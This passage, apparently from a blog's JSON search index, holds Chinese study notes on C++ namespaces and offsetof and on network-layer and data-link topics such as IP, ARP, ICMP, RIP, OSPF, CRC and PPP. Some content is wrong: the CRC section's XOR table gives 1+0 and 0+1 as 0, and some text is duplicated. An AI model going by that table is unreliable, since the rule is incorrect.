&#125; namespace xiaochenyanD &#123; typedef struct student &#123; double score; &#125;student_t; &#125; //默认使用xiaochenyanC命名空间下的变量或对象,不建议这样做 using namespace xiaochenyanC;&#125;int main(int argc, char* argv[])&#123; using namespace xiaochenyanA; using namespace xiaochenyanB; using namespace xiaochenyanB::xiaochenyanC; student_t xiaoming = &#123; 100.0f &#125;; cout &lt;&lt; xiaoming.score &lt;&lt; endl; //如果命名空间中的对象冲突,需要使用命名空间名来引用对象 cout &lt;&lt; (xiaochenyanA::a = 100) &lt;&lt; endl; cout &lt;&lt; xiaochenyanA::a &lt;&lt; endl; cout &lt;&lt; xiaochenyanB::a &lt;&lt; endl; //程序暂停 cin.get(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"namespace命名空间","slug":"cpp0002-namespace命名空间","date":"2021-04-14T16:43:28.000Z","updated":"2021-04-14T18:29:40.618Z","comments":true,"path":"2021/04/15/cpp0002-namespace命名空间/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0002-namespace命名空间/","excerpt":"","text":"namespace命名空间 假如同一个公司有两个张三，当你叫张三的时候，两个张三都会回头。这就出现了二义性。 为了区分这两个张三，就引进了命名空间。 第一个张三可以叫为张三A 第二个张三可以叫为张三B 12345678910111213141516171819#include&lt;iostream&gt;//方式1，可以直接使用std内的元素using namespace std;//方式2，可以直接使用coutusing std::cout;int main(int argc, char* argv[])&#123; //方式3，通过命名空间名来引用cout std::cout; return 0;&#125; 12345678910111213141516#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; &#123; //只能在本复合语句内使用 using std::cout; &#125; cout &lt;&lt; a;//出错 return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"关于#define offsetof(s,m) (size_t)&(((s *)0)->m)","slug":"cpp0000offsetof","date":"2021-04-14T16:37:42.000Z","updated":"2021-05-26T02:45:10.584Z","comments":true,"path":"2021/04/15/cpp0000offsetof/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0000offsetof/","excerpt":"","text":"#define offsetof(s,m) (size_t)&amp;(((s *)0)-&gt;m) s是一个结构体，m是s的成员变量 这个宏的作用是取到s中的m相对于s的偏移量 (s *)0 将0强制转换为s类型的指针，并指向0地址 ((s *)0)-&gt;m 使该指针指向成员变量m &amp;(((s *)0)-&gt;m)获取成员变量m的地址，因为首地址是0，所以m的地址值就等于m的偏移量。此处编译器不会生成访问m的代码，而是直接计算出地址值 (size_t)&amp;(((s *)0)-&gt;m) 将地址转换为size_t类型","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"第一个c++程序 hello world","slug":"cpp0001第一个c-程序-hello-world","date":"2021-04-14T16:37:42.000Z","updated":"2021-04-14T16:42:43.811Z","comments":true,"path":"2021/04/15/cpp0001第一个c-程序-hello-world/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0001第一个c-程序-hello-world/","excerpt":"","text":"第一个c++程序 hello world 123456789101112131415#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; cout &lt;&lt; \"hello world\" &lt;&lt; endl; int a; cin &gt;&gt; a; return 0;&#125; cout 表示输出流，将hello world流到终端 endl 表示换行 cin 表示输入流，从键盘输入内容流到变量a中 1234if 0//可以理解为注释,编译器会忽略里面的代码endif","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"第四章网络层","slug":"计算机网络原理笔记-第四章网络层","date":"2021-04-14T15:31:49.000Z","updated":"2021-04-14T16:06:16.574Z","comments":true,"path":"2021/04/14/计算机网络原理笔记-第四章网络层/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/14/计算机网络原理笔记-第四章网络层/","excerpt":"","text":"计算机网络原理笔记 第四章 网络层 网络层提供得两种服务 1.虚电路服务 2.数据包服务 虚电路服务与数据报服务的对比 网际协议 IP 1.虚拟互联网 2.IP地址 3.划分子网和构造超网 4.IP地址与硬件地址 5.ARP &amp; RARP 6.IP数据报格式 7.IP转发分组的流程 网际控制报文协议 ICMP 互联网的路由选择协议 （1）内部网关协议RIP (2)内部网关协议OSPF IP多播 网络地址转换NAT 网络层提供得两种服务 网络层提供的两种服务 在计算机网络领域，网络层应该向运输层提供怎样的服务（“面向连接”还是“无连接”）曾引起了长期的争论。 争论焦点的实质就是：在计算机通信中，可靠交付应当由谁来负责？是网络还是网络层提供的两种服务 在计算机网络领域，网络层应该向运输层提供怎样的服务（“面向连接”还是“无连接”）曾引起了长期的争论。 争论焦点的实质就是：在计算机通信中，可靠交付应当由谁来负责？是网络还是端系统？ ？ 两种服务：网络层应该向运输层提供怎样得服务 虚电路服务 数据包服务 1.虚电路服务 面向连接的通信方式 建立虚电路(Virtual Circuit)，以保证双方通信所需的一切网络资源。 如果再使用可靠传输的网络协议，就可使所发送的分组无差错按序到达终点。 虚电路是逻辑连接 虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发方式传送，而并不是真正建立了一条物理连接。 请注意，电路交换的电话通信是先建立了一条真正的连接。因此分组交换的虚连接和电路交换的连接只是类似，但并不完全一样。 . . 2.数据包服务 因特网采用的设计思路 网络层向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务。 网络在发送分组时不需要先建立连接。每一个分组（即 IP 数据报）独立发送，与其前后的分组无关（不进行编号）。 网络层不提供服务质量的承诺。即所传送的分组可能出错、丢失、重复和失序（不按序到达终点），当然也不保证分组传送的时限。 . . 尽最大努力交付的好处 由于传输网络不提供端到端的可靠传输服务，这就使网络中的路由器可以做得比较简单，而且价格低廉（与电信网的交换机相比较）。 如果主机（即端系统）中的进程之间的通信需要是可靠的，那么就由网络的主机中的运输层负责（包括差错处理、流量控制等）。 采用这种设计思路的好处是：网络的造价大大降低，运行方式灵活，能够适应多种应用。 因特网能够发展到今日的规模，充分证明了当初采用这种设计思路的正确性。 . . 虚电路服务与数据报服务的对比 对比的方面 虚电路服务 数据报服务 思路 可靠通信应当由网络来保证 可靠通信应当由用户主机来保证 连接的建立 必须有 不需要 终点地址 仅在连接建立阶段使用，每个分组使用短的虚电路号 每个分组都有终点的完整地址 分组的转发 属于同一条虚电路的分组均按照同一路由进行转发 每个分组独立选择路由进行转发 当结点出故障时 所有通过出故障的结点的虚电路均不能工作 出故障的结点可能会丢失分组，一些路由可能会发生变化 分组的顺序 总是按发送顺序到达终点 到达终点时不一定按发送顺序 端到端的差错处理和流量控制 可以由网络负责，也可以由用户主机负责 由用户主机负责 . . 网际协议 IP 1.虚拟互联网 网络层中间设备 中间设备又称为中间系统或中继(relay)系统。 物理层中继系统：转发器(repeater)。 数据链路层中继系统：网桥或桥接器(bridge)。 网络层中继系统：路由器(router)。 网络层以上的中继系统：网关(gateway)。 注： 现在说的网关一般指的是路由器接口，网关地址一般习惯使用本网段第一个地址或者最后一个地址 虚拟互连网络的意义 所谓虚拟互连网络也就是逻辑互连网络，它的意思就是互连起来的各种物理网络的异构性本来是客观存在的，但是我们利用 IP 协议就可以使这些性能各异的网络从用户看起来好像是一个统一的网络。 使用 IP 协议的虚拟互连网络可简称为 IP 网。 使用虚拟互连网络的好处是：当互联网上的主机进行通信时，就好像在一个网络上通信一样，而看不见互连的各具体的网络异构细节。 . . 2.IP地址 本小节我转载了与韩老师讲解思路一致 但是总结的更详细的IP地址与划分博文合集笔记供大家阅读 点下方链接就可进入 1、IP地址和子网划分学习笔记之《预备知识：进制计数》 2、IP地址和子网划分学习笔记之《IP地址详解》 3、IP地址和子网划分学习笔记之《子网掩码详解》 3.划分子网和构造超网 本小节我转载了与韩老师讲解思路一致 但是总结的更详细的IP地址与划分博文合集笔记供大家阅读 点下方链接就可进入 4、IP地址和子网划分学习笔记之《子网划分详解》 5、IP地址和子网划分学习笔记之《超网合并详解》 4.IP地址与硬件地址 本小节我转载了与韩老师讲解思路一致 但是总结的更详细的IP地址与划分博文合集笔记供大家阅读 点下方链接就可进入 2、IP地址和子网划分学习笔记之《IP地址详解》 . . 5.ARP &amp; RARP ARP简介 不管网络层使用的是什么协议，在实际网络的链路上传送数据帧时，最终还是必须使用硬件地址。 每一个主机都设有一个 ARP 高速缓存(ARP cache)，里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。 当主机 A 欲向本局域网上的某个主机 B 发送 IP 数据报时，就先在其 ARP 高速缓存中查看有无主机 B 的 IP 地址。如有，就可查出其对应的硬件地址，再将此硬件地址写入 MAC 帧，然后通过局域网将该 MAC 帧发往此硬件地址。 ARP高速缓存的作用 为了减少网络上的通信量，主机 A 在发送其 ARP 请求分组时，就将自己的 IP 地址到硬件地址的映射写入 ARP 请求分组。 当主机 B 收到 A 的 ARP 请求分组时，就将主机 A 的这一地址映射写入主机 B 自己的 ARP 高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。 . . 使用 ARP 的四种典型情况 发送方是主机，要把IP数据报发送到本网络上的另一个主机。这时用 ARP 找到目的主机的硬件地址。 发送方是主机，要把 IP 数据报发送到另一个网络上的一个主机。这时用 ARP 找到本网络上的一个路由器的硬件地址。剩下的工作由这个路由器来完成。 发送方是路由器，要把 IP 数据报转发到本网络上的一个主机。这时用 ARP 找到目的主机的硬件地址。 发送方是路由器，要把 IP 数据报转发到另一个网络上的一个主机。这时用 ARP 找到本网络上的一个路由器的硬件地址。剩下的工作由这个路由器来完成。 . . 应当注意的问题 ARP 是解决同一个局域网上的主机或路由器的 IP 地址和硬件地址的映射问题。 如果所要找的主机和源主机不在同一个局域网上，那么就要通过 ARP 找到一个位于本局域网上的某个路由器的硬件地址，然后把分组发送给这个路由器，让这个路由器把分组转发给下一个网络。剩下的工作就由下一个网络来做。 从IP地址到硬件地址的解析是自动进行的，主机的用户对这种地址解析过程是不知道的。 只要主机或路由器要和本网络上的另一个已知 IP 地址的主机或路由器进行通信，ARP 协议就会自动地将该 IP 地址解析为链路层所需要的硬件地址。 . . 逆地址解析协议 RARP 逆地址解析协议 RARP 使只知道自己硬件地址的主机能够知道其 IP 地址。 . 6.IP数据报格式 IP数据包 一个 IP 数据包由首部和数据两部分组成。 首部的前一部分是固定长度，共 20 字节，是所有 IP 数据报必须具有的。 在首部的固定部分的后面是一些可选字段，其长度是可变的。 IP 数据报首部的固定部分中的各字段 版本——占4位，指IP协议的版本，目前使用的IP协议版本号为4（即IPv4） 首部长度——占4位，课表示的最大数值 是15个单位(一个单位为4字节)，因此IP的首部长度的最大值是60字节。 区分服务——让数据包加上一个标记，来告诉网络上那些传输的数据，这些数据包在传的时候 是着急还是不着急。QOS服务质量 总长度——占16位，指首部和数据之和的长度，单位位字节，因此数据报的最大长度位65535字节。总长度必须不超过最大传送单元MTU。 标识——占16位，它是一个计数器，用老产生数据报的标识，不是序号，每产生一个数据包，就增加1。 标志——占3位，目前只有前两位有意义。标志字段的最低位是MF。 MF=1表示后面“还有分片”。MF=0表示最后一个分片。标志字段中间的一位是DF。 只有当DF=0时才允许分片。 生存时间 记位TTL （Time To Live） 占8位，数据报在网络中可通过的路由器数的最大值 数据包没过一个路由器 TTL-1 协议——协议（8位）字段指出此数据报携带的数据使用何种学语以便目的主机的IP层讲数据部分交给哪个处理 首部检验和——首部检验和(16 位)字段只检验数据报的首部，不检验数据部分。这里不采用 CRC 检验码而采用简单的计算方法。 . . IP数据报首部的可变部分 IP 首部的可变部分就是一个选项字段，用来支持排错、测量以及安全等措施，内容很丰富。 选项字段的长度可变，从 1 个字节到 40 个字节不等，取决于所选择的项目。 增加首部的可变部分是为了增加 IP 数据报的功能，但这同时也使得 IP 数据报的首部长度成为可变的。这就增加了每一个路由器处理数据报的开销。 实际上这些选项很少被使用。 . . 7.IP转发分组的流程 数据包如何路由 IP路由 路由就是路由器从一个网段到另外一个网段转发数据包的过程，即数据包通过路由器转发，就是数据路由。 网络畅通条件，要求数据包必须能够到达目标地址，同时数据包必须能够返回发送地址。 这就要求沿途经过的路由器必须知道到目标网络如何转发数据包，即到达目的网络下一跳转发给哪个路由器，也就是必须有到达目标网络的路由，沿途的路由器还必须有数据包返回所需的路由。 . 数据路由：路由器在不同网段转发数据包 网络畅通的条件：能去能回 沿途的路由器必须知道目标网络下一跳给哪个接口 沿途的路由器必须知道源网络下一跳给哪个接口 如图所示，计算机PC0 ping PC1，网络要想通，要求沿途的路由器Router0，Router1，Router2，Router3都必须有到192.168.1.0/24网络的路由，这样数据包才能到达PC1。 PC1要回应数据包给PC0，沿途所有的路由器必须有到192.168.0.0/24网络的路由，这样数据包才能回来。 . . 配置静态路由 默认路由 网络地址和子网掩码都为0，如图所示配置，这就意味着到任何网络下一跳转发给10.0.0.2。 网络地址和子网掩码均为0的路由就是默认路由。 Router(config)#ip route 0.0.0.0 0.0.0.0 10.0.0.2 . . Windows上的默认路由和网关 计算机也有路由表，我们可以在计算机上运行route print显示Windows操作系统上的路由表。 运行netstat –r也可以显示Windows操作系统上的路由表。 如图所示，给计算机配置网关就是给计算机添加默认路由。 . . 如果不配置计算机的网关，使用以下命令添加默认路由。 如图所示，去掉本地连接的网关，在命令提示符下，输入route print ，可以看到没有默认路由了，该计算机也不能访问其他网段，ping 202.99.160.68 提示“目标主机不可到达”。 . . 如图所示，在命令提示符下，输入route /?可以看到该命令的帮助。 输入route add 0.0.0.0 mask 0.0.0.0 192.168.8.1，添加默认路由。 输入route print 可以显示路由表，默认路由已经出现。 Ping 202.99.160.68 可以ping通。 . . 如图所示，内网的计算机需要配置IP地址、子网掩码和网关，网关就是Server的内网网卡的IP地址。在Server的两个连接，内网的网卡不需要配置网关，但是连接Internet的网卡需要配置默认网关。 . . 注意 IP 数据报的首部中没有地方可以用来指明“下一跳路由器的 IP 地址”。 当路由器收到待转发的数据报，不是将下一跳路由器的 IP 地址填入 IP 数据报，而是送交下层的网络接口软件。 网络接口软件使用 ARP 负责将下一跳路由器的 IP 地址转换成硬件地址，并将此硬件地址放在链路层的 MAC 帧的首部，然后根据这个硬件地址找到下一跳路由器。 . . 网际控制报文协议 ICMP ICMP简介 为了提高 IP 数据报交付成功的机会，在网际层使用了网际控制报文协议 ICMP (Internet Control Message Protocol)。 ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告。 ICMP 不是高层协议，而是 IP 层的协议。 ICMP 报文作为 IP 层数据报的数据，加上数据报的首部，组成 IP 数据报发送出去。 . . ICMP报文格式 . . ICMP报文的类型 ICMP 报文的种类有两种，即 ICMP 差错报告报文和 ICMP 询问报文。 ICMP 报文的前 4 个字节是统一的格式，共有三个字段：即类型、代码和检验和。接着的 4 个字节的内容与 ICMP 的类型有关。 差错报告报文有五种：终点不可达 ，源点抑制(Source quench) ，时间超过 ，参数问题 ，改变路由（重定向）(Redirect) 询问报文有两种：回送请求和回答报文，时间戳请求和回答报文 差错报告报告报文的数据字段的内容 . . ICMP应用举例 PING 用来测试两个主机之间的连通性。 PING 使用了 ICMP 回送请求与回送回答报文。 PING 是应用层直接使用网络层 ICMP 的例子，它没有通过运输层的 TCP 或UDP。 Pathping tracert . . ping命令诊断网络故障 PING（Packet Internet Grope），因特网包探索器，用于测试网络连接量的程序。Ping发送一个ICMP回声请求消息给目的地并报告是否收到所希望的ICMP回声应答。 ping指的是端对端连通，通常用来作为可用性的检查， 但是某些病毒木马会强行大量远程执行ping命令抢占你的网络资源，导致系统变慢，网速变慢。 严禁ping入侵作为大多数防火墙的一个基本功能提供给用户进行选择。 如果你打开IE浏览器访问网站失败，你可以通过ping命令测试到Internet的网络连通，可以为你排除网络故障提供线索，下面展示ping命令返回的信息以及分析其原因。 . 目标主机不可到达 目标网络不可到达 请求超时 通过延迟评估网络带宽 . . Pathping跟踪数据包的路径 使用ping能够判断网络通还是不通，比如请求超时，你就不能判断什么位置出现的网络故障造成的请求超时。使用pathping命令能跟踪数据包的路径，能够查出故障点，并且能够计算路由器转发丢包率和链路丢包率以及延迟，据此能够判断出网络拥塞情况。 互联网的路由选择协议 路由选择协议的核心就是路由算法，一个理想的路由算法应该以下特点： 算法必须是正确的和完整的：沿着各路由表所指引的路由，分组一定能够最终到达目的网络和目的主机 算法在计算上应简单 算法应能适应通信量和网络拓扑的变化：即要有自适应性。 算法应具有稳定性 算法应该是公平的 算法应该是最佳的 路由选择包括静态和动态： 静态（非自适应路由选择）：简单和开销较小，但不能及时适应网络状态的变化，适用于简单的小网络 动态（自适应路由）：能较好地适应网络状态的变化。但实现起来较为复杂，开销比较大。 互联网才用的路由选择协议主要是自适应、分布式路由选择协议，由于以下两个原因，互联网采用分层次的路由选择协议： 互联网的规模非常大，如果让所有的路由器知道所有的网络应怎样到达，则这种路由表将非常大 许多单位不愿意外界了解自己单位网路的布局细节和本部门所采用的路由选择协议，但同时还希望连接到互联网上。 . 为此，把整个互联网划分为许多较小的自治系统AS（autonomous system）。自治系统AS是在单一技术管理下的一组路由器，这些路由器使用一种自治系统内部的路由选择协议和共同的度量。一个AS对其他AS表现出的是一个单一的和一直的路由选择策略。 这样就把路由选择协议划分为两大类： 内部网关协议IGP（Interior Gateway protocol）:也叫作域内路由选择，即在一个自治系统内部使用的路由选择协议，如RIP和OSPF协议。 外部网关协议EGP（External Gateway Protocol）：也叫作域间路由选择，若源主机和目的主机处在不同的自治系统中，当数据报传到一个自治系统的边界时，就需要使用一种协议将路由选择信息传递到另一个自治系统中。 （1）内部网关协议RIP RIP是一种分布式的基于距离向量的路由选择协议。 RIP要求每一个路由器都要维护从它自己到其他每一个目的网络距离记录。 距离的定义：从一个路由器到直接连接的网络的距离定义为1/0，其中每经过一次路由器就加1，也称为“跳数”。 分布式路由的特点就是：每一个路由器都要不断地和其他一些路由器交换路由信息，周期性广播。 RIP协议的特点： 仅和相邻路由器交换信息。 路由器交换的信息使当前本路由器所知道的全部信息，即自己现在的路由表，包括到本自治网络的最短距离，以及到每个网络应经过的下一跳路由器。 按照固定的时间间隔交换路由信息。 路由器刚刚开始工作时，它的路由表是空的，经过若干次更新后，所有路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址。 距离向量算法：找出每个目的网络的最短距离算法。 收到相邻路由器（其地址为 X）的一个 RIP 报文： (1) 先修改此 RIP 报文中的所有项目：把“下一跳”字段中的地址都改为 X，并把所有的“距离”字段的值加 1。 (2) 对修改后的 RIP 报文中的每一个项目，重复以下步骤： 若项目中的目的网络不在路由表中，则把该项目加到路由表中。 否则 ​ 若下一跳字段给出的路由器地址是同样的，则把收到的项 目 替换原路由表中的项目。 否则 ​ 若收到项目中的距离小于路由表中的距离，则进行更新， 否则，什么也不做。 (3) 若 3 分钟还没有收到相邻路由器的更新路由表，则把此相邻路由器记为不可达路由器，即将距离置为16（距离为16表示不可达）。 RIP协议的优缺点 RIP 存在的一个问题是当网络出现故障时，要经过比较长的时间才能将此信息传送到所有的路由器。 RIP 协议最大的优点就是实现简单，开销较小。 RIP 限制了网络的规模，它能使用的最大距离为 15（16 表示不可达）。 路由器之间交换的路由信息是路由器中的完整路由表，因而随着网络规模的扩大，开销也就增加。 . . (2)内部网关协议OSPF OSPF 协议的基本特点 “开放”表明 OSPF 协议不是受某一家厂商控制，而是公开发表的。 “最短路径优先”是因为使用了 Dijkstra 提出的最短路径算法SPF OSPF 只是一个协议的名字，它并不表示其他的路由选择协议不是“最短路径优先”。 是分布式的链路状态协议。 . . 三个要点 向本自治系统中所有路由器发送信息，这里使用的方法是洪泛法。 发送的信息就是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。 “链路状态”就是说明本路由器都和哪些路由器相邻，以及该链路的“度量”(metric)。 只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息。 . . 链路状态数据库 由于各路由器之间频繁地交换链路状态信息，因此所有的路由器最终都能建立一个链路状态数据库。 这个数据库实际上就是全网的拓扑结构图，它在全网范围内是一致的（这称为链路状态数据库的同步）。 OSPF 的链路状态数据库能较快地进行更新，使各个路由器能及时更新其路由表。OSPF 的更新过程收敛得快是其重要优点。 \\ OSPF 划分为两种不同的区域 划分区域 划分区域的好处就是将利用洪泛法交换链路状态信息的范围局限于每一个区域而不是整个的自治系统，这就减少了整个网络上的通信量。 在一个区域内部的路由器只知道本区域的完整网络拓扑，而不知道其他区域的网络拓扑的情况。 OSPF 使用层次结构的区域划分。在上层的区域叫作主干区域(backbone area)。主干区域的标识符规定为0.0.0.0。主干区域的作用是用来连通其他在下层的区域。 OSPF 直接用 IP 数据报传送 OSPF 不用 UDP 而是直接用 IP 数据报传送。 OSPF 构成的数据报很短。这样做可减少路由信息的通信量。 数据报很短的另一好处是可以不必将长的数据报分片传送。分片传送的数据报只要丢失一个，就无法组装成原来的数据报，而整个数据报就必须重传。 . . OSPF 的其他特点 OSPF 对不同的链路可根据 IP 分组的不同服务类型 TOS 而设置成不同的代价。因此，OSPF 对于不同类型的业务可计算出不同的路由。 如果到同一个目的网络有多条相同代价的路径，那么可以将通信量分配给这几条路径。这叫作多路径间的负载平衡。 所有在 OSPF 路由器之间交换的分组都具有鉴别的功能。 支持可变长度的子网划分和无分类编址 CIDR。 每一个链路状态都带上一个 32 位的序号，序号越大状态就越新。 OSPF 的五种分组类型 类型1，问候(Hello)分组。 类型2，数据库描述(Database Description)分组。 类型3，链路状态请求(Link State Request)分组。 类型4，链路状态更新(Link State Update)分组， 用洪泛法对全网更新链路状态。 类型5，链路状态确认(Link State Acknowledgment) 分组。 . . OSPF 的其他特点 OSPF 还规定每隔一段时间，如 30 分钟，要刷新一次数据库中的链路状态。 由于一个路由器的链路状态只涉及到与相邻路由器的连通状态，因而与整个互联网的规模并无直接关系。因此当互联网规模很大时，OSPF 协议要比距离向量协议 RIP 好得多。 OSPF 没有“坏消息传播得慢”的问题，据统计，其响应网络变化的时间小于 100 ms。 IP多播 网络地址转换NAT","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"第三章 数据链路层","slug":"计算机网络原理笔记-第三章-数据链路层","date":"2021-03-31T16:50:41.000Z","updated":"2021-03-31T18:00:00.421Z","comments":true,"path":"2021/04/01/计算机网络原理笔记-第三章-数据链路层/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/01/计算机网络原理笔记-第三章-数据链路层/","excerpt":"","text":"计算网络原理 第三章 数据链路层 数据链路层（一） 3.1 使用点对点信道的数据链路层 3.1.1 数据链路层和帧 3.1.2 三个基本问题 数据链路层的信道类型 3.2 点对点协议 PPP 3.2.1 PPP协议的特点 3.2.2 PPP协议的帧格式 3.2.3 PPP协议的工作状态 3.3 使用广播信道的数据链路层(局域网) 3.3.1 局域网的数据链路层 数据链路层（一） 3.1 使用点对点信道的数据链路层 3.1.1 数据链路层和帧 *数据发送模型* *数据链路层的信道类型* 数据链路层使用的信道主要有以下两种类型： 点对点信道。这种信道使用一对一的点对点通信方式。 广播信道。这种信道使用一对多的广播通信方式，因此过程比较复杂。广播信道上连接的主机很多，因此必须使用专用的共享信道协议来协调这些主机的数据发送。 . . 链路与数据链路 **链路(link)**是一条无源的点到点的物理线路段，中间没有任何其他的交换结点。 一条链路只是一条通路的一个组成部分。 数据链路(data link) 除了物理线路外，还必须有通信协议来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。 现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。 一般的适配器都包括了数据链路层和物理层这两层的功能。 帧 数据链路层传送的是帧 . . 3.1.2 三个基本问题 1.封装成帧 封装成帧(framing) 就是在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。确定帧的界限。 首部和尾部的一个重要作用就是进行帧定界。 用控制字符进行帧定界的方法举例 试想：帧还未发送完，发送端出了问题，只能重发该帧。接收端却收到了前面的“半截子帧”，它会抛弃吗？为什么？ 2.透明传输 若传输的数据是ASCII码中“可打印字符(共95个)“集时，一切正常。 若传输的数据不是仅由”可打印字符”组成时，就会出问题，如下 用字节填充法解决透明传输问题 发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC”(其十六进制编码是 1B)。 字节填充(byte stuffing)或字符填充(character stuffing)——接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。 如果转义字符也出现数据当中，那么应在转义字符前面插入一个转义字符。当接收端收到连续的两个转义字符时，就删除其中前面的一个。 当传送的帧是用文本文件组成的帧时（文本文件中的字都是从键盘上输入的），其数据部分显然不会出现像SOH或EOT这样的帧定界控制字符。可见不管从键盘上输入什么字符都可以放在这样的帧中传输过去，因此这样的传输就是透明传输。 . . 3.差错控制 在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1。 在一段时间内，传输错误的比特占所传输比特总数的比率称为误码率 BER (Bit Error Rate)。 误码率与信噪比有很大的关系。 为了保证数据传输的可靠性，在计算机网络传输数据时，必须采用各种差错检测措施。 循环冗余检验的原理 在数据链路层传送的帧中，广泛使用了循环冗余检验 CRC 的检错技术。 在发送端，先把数据划分为组。假定每组 k 个比特。 假设待传送的一组数据 M = 101001（现在 k = 6）。我们在 M 的后面再添加供差错检测用的 n 位冗余码一起发送。 冗余码的计算 用二进制的模 2 运算进行 2n 乘 M 的运算，这相当于在 M 后面添加 n 个 0。 得到的 (k + n) 位的数除以事先选定好的长度为 (n + 1) 位的除数 P，得出商是 Q 而余数是 R，余数 R 比除数 P 少1 位，即 R 是 n 位。 冗余码的计算举例 现在 k = 6, M = 101001。 设 n = 3, 除数 P = 1101， 被除数是 2n**M = 101001000。 模 2 运算的结果是：商 Q = 110101， 余数 R = 001。 把余数 R 作为冗余码添加在数据 M 的后面发送出去。发送的数据是：2n**M + R 即：101001001，共 (k + n) 位。 循环冗余检验的原理说明 帧检验序列 FCS 在数据后面添加上的冗余码称为帧检验序列 FCS (Frame Check Sequence)。 循环冗余检验 CRC 和帧检验序列 FCS并不等同。 CRC 是一种常用的检错方法，而 FCS 是添加在数据后面的冗余码。 FCS 可以用 CRC 这种方法得出，但 CRC 并非用来获得 FCS 的唯一方法。 接收端对收到的每一帧进行 CRC 检验 (1) 若得出的余数 R = 0，则判定这个帧没有差错，就接受(accept)。 (2) 若余数 R ≠ 0，则判定这个帧有差错，就丢弃。 但这种检测方法并不能确定究竟是哪一个或哪几个比特出现了差错。 只要经过严格的挑选，并使用位数足够多的除数 P，那么出现检测不到的差错的概率就很小很小。 补零位数比除数位数少一 异或运算 1+1=0 1+0=0 0+1=0 0+0=0 除数由两台计算机数据链路层协议决定 *小结：CRC差错检测技术* 仅用循环冗余检验 CRC 差错检测技术只能做到无差错接受(accept)。 “无差错接受”是指：“凡是接受的帧（即不包括丢弃的帧），我们都能以非常接近于 1 的概率认为这些帧在传输过程中没有产生差错”。也就是说：“凡是接收端数据链路层接受的帧都没有传输差错”（有差错的帧就丢弃而不接受）。 要做到“可靠传输”（即发送什么就收到什么）就必须再加上确认和重传机制。 考虑：帧重复、帧丢失、帧乱序的情况 可以说“CRC是一种无比特差错，而不是无传输差错的检测机制” OSI/RM模型的观点:数据链路层要做成无传输差错的!但这种理念目前不被接受。 . . . 数据链路层的信道类型 •数据链路层使用的信道主要有以下两种类型： 点对点信道。 这种信道使用一对一的点对点通信方式。 广播信道。 这种信道使用一对多的广播通信方式，因此过程比较复杂。广播信道上连接的主机很多，因此必须使用专用的共享信道协议来协调这些主机的数据发。 . · 3.2 点对点协议 PPP 现在全世界使用得最多的数据链路层协议是点对点协议 PPP (Point-to-Point Protocol)。 用户使用拨号电话线接入因特网时，一般都是使用 PPP 协议。 用户到 ISP 的链路使用 PPP 协议 3.2.1 PPP协议的特点 PPP 协议应满足的需求 简单——这是首要的要求 封装成帧 透明性 多种网络层协议 多种类型链路 差错检测 检测连接状态 最大传送单元 网络层地址协商 数据压缩协商 · PPP 协议不需要的功能 纠错 流量控制 序号 多点线路 半双工或单工链路 PPP 协议的组成 1992 年制订了 PPP 协议。经过 1993 年和 1994 年的修订，现在的 PPP 协议已成为因特网的正式标准[RFC 1661]。 PPP 协议有三个组成部分 一个将 IP 数据报封装到串行链路的方法。 链路控制协议 LCP (Link Control Protocol)。 网络控制协议 NCP (Network Control Protocol)。 . . 3.2.2 PPP协议的帧格式 标志字段 F = 0x7E （符号“0x”表示后面的字符是用十六进制表示。十六进制的 7E 的二进- - 制表示是 01111110）。 地址字段 A 只置为 0xFF。地址字段实际上并不起作用。 控制字段 C 通常置为 0x03。 PPP 是面向字节的，所有的 PPP 帧的长度都是整数字节。 透明传输问题 当 PPP 用在同步传输链路时，协议规定采用硬件来完成比特填充（和 HDLC 的做法一样）。 当 PPP 用在异步传输时，就使用一种特殊的 字符填充法 。 字符填充 将信息字段中出现的每一个 0x7E 字节转变成为 2 字节序列(0x7D, 0x5E)。 若信息字段中出现一个 0x7D 的字节, 则将其转变成为 2 字节序列(0x7D, 0x5D)。 若信息字段中出现 ASCII 码的控制字符（即数值小于 0x20 的字符），则在该字符前面要加入一个 0x7D 字节，同时将该字符的编码加以改变。 . 零比特填充 PPP 协议用在 SONET/SDH 链路时，是使用同步传输（一连串的比特连续传送）。这时 PPP 协议采用零比特填充方法来实现透明传输。 在发送端，只要发现有 5 个连续 1，则立即填入一个 0。接收端对帧中的比特流进行扫描。每当发现 5 个连续1时，就把这 5 个连续 1 后的一个 0 删除。 . . 不提供使用序号和确认 的可靠传输 PPP 协议之所以不使用序号和确认机制是出于以下的考虑： 在数据链路层出现差错的概率不大时，使用比较简单的 PPP 协议较为合理。 在因特网环境下，PPP 的信息字段放入的数据是 IP 数据报。数据链路层的可靠传输并不能够保证网络层的传输也是可靠的。 帧检验序列 FCS 字段可保证无差错接受。 . . 